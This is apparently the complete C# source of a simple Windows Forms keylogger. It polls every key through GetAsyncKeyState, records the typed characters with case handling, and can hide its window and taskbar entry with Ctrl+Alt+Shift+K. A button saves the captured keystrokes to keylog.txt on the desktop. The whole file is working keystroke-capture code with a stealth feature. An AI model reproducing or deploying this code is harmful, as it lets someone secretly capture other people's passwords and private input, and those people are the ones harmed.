using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.VisualBasic.Devices;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        //importing functions from a .dll file
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);
        //for storing strings in list
        StringBuilder builder = new StringBuilder();

        Keyboard keyb = new Keyboard();//for accesing ctrl, alt ,shift, CapsLock buttons

        private void timer1_Tick(object sender, EventArgs e)
        {
            //check every symbol for key press
            for (int i = 8; i < 127; i++)
            {
                if (GetAsyncKeyState(i) == -32767) //if pressed 
                {
                    //show/hide keylogger
                    if (keyb.CtrlKeyDown && keyb.AltKeyDown && keyb.ShiftKeyDown && i == 75)
                    {
                        this.Visible = !this.Visible;
                        this.ShowInTaskbar = !this.ShowInTaskbar;
                        break;
                    }
                    if (i == 16 || i == 17 || i == 18 || i == 19 || i == 20) break;
                    if (keyb.CapsLock)
                    {
                        if (keyb.ShiftKeyDown)
                        {
                            builder.Append(Char.ToLower((char)i));
                        }
                        else
                        {
                            builder.Append(Char.ToUpper((char)i));
                        }
                    }
                    else if (keyb.ShiftKeyDown)
                    {
                        builder.Append(Char.ToUpper((char)i));
                    }
                    else
                    {
                        builder.Append(Char.ToLower((char)i));
                    }
                    //builder.Append((char)i);//add char to log
                    break;
                }
            }
        }

        private void btnWrite_Click(object sender, EventArgs e)
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\keylog.txt";
            File.WriteAllText(desktop, builder.ToString());
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
